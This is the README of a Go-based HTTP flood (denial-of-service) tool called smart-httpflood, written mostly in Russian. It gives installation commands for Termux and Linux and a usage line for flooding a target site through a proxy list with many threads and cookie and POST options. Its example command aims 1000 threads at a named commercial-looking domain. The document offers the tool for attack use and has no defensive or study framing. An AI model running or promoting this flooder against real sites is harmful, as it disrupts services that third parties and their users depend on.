# smart-httpflood
Простой http флуддер(DoS) на Go

This script supports HTTP Version, Cookie and Post Data.
<h4>Поддерживает:</h4>
HTTP, куки, POST запросы
Установка:
Зависит от вашей платформы. Поддерживает Termux и Linux
<b>Termux:</b><br>
<code>pkg install golang</code>

<b>Manjaro Linux(Arch дистры):</b><br>
<code>sudo pacman -S go</code>

<b>Kali Linux(Debian дистры, если что Ubuntu к ним относится):</b><br>
<code>sudo apt install golang</code>

Далее для всех платформ одинаковые команды:<br>
<code>git clone https://github.com/ret7020/smart-httpflood/</code><br>
<code>cd smart-httpflood</code><br>
<code>go build</code><br>

<h4>Использование</h4><br>

<b>Формат команды:</b><br>
<code>./StresserUS version=<version> host=<host> domain=<host header> limit=<rs-ip> time=<time> list=<proxies.txt> threads=<threads> mode=GET/POST cookie=<ddos=true> data=<post=true></code><br>

  Пример команды:<br>
 <code>./StresserUS version=2 host=https://pizza-delivery.com limit=64 time=120 list=proxy.txt threads=1000 mode=GET</code>
